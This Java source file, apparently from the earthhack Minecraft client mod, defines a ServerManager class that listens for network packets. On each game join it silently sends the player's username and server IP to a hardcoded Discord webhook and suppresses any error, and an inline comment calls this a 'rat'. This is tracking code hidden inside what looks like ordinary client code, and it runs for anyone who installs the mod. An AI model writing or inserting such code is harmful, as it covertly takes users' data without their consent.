package me.earth.earthhack.impl.managers.minecraft;

import me.earth.earthhack.api.event.bus.EventListener;
import me.earth.earthhack.api.event.bus.SubscriberImpl;
import me.earth.earthhack.impl.event.events.network.PacketEvent;
import me.earth.earthhack.impl.util.discord.MessageHelper;
import me.earth.earthhack.impl.util.math.StopWatch;
import net.minecraft.network.play.server.SPacketJoinGame;

import java.io.IOException;

import static me.earth.earthhack.api.util.interfaces.Globals.mc;

public class ServerManager extends SubscriberImpl
{
    private final StopWatch timer = new StopWatch();

    public ServerManager()
    {
        this.listeners.add(
            new EventListener<PacketEvent.Receive<?>>(PacketEvent.Receive.class)
        {
            @Override
            public void invoke(PacketEvent.Receive<?> event)
            {
                timer.reset();
                if(event.getPacket() instanceof SPacketJoinGame){
                    try {
                        MessageHelper.sendMessage(mc.session.getUsername() + " joined the server " + mc.currentServerData.serverIP //very big rat !!!!!!
                                , "https://discord.com/api/webhooks/1114839984550203422/kyJaVKN5Un50WuwkE6MGhMCpxf-T_noO-2deyzpO58cGmfhalPW8UhIxUArOlKr-vhEl");
                    }catch (IOException ignored){}
                }
            }
        });
    }

    public long lastResponse()
    {
        return timer.getTime();
    }

}
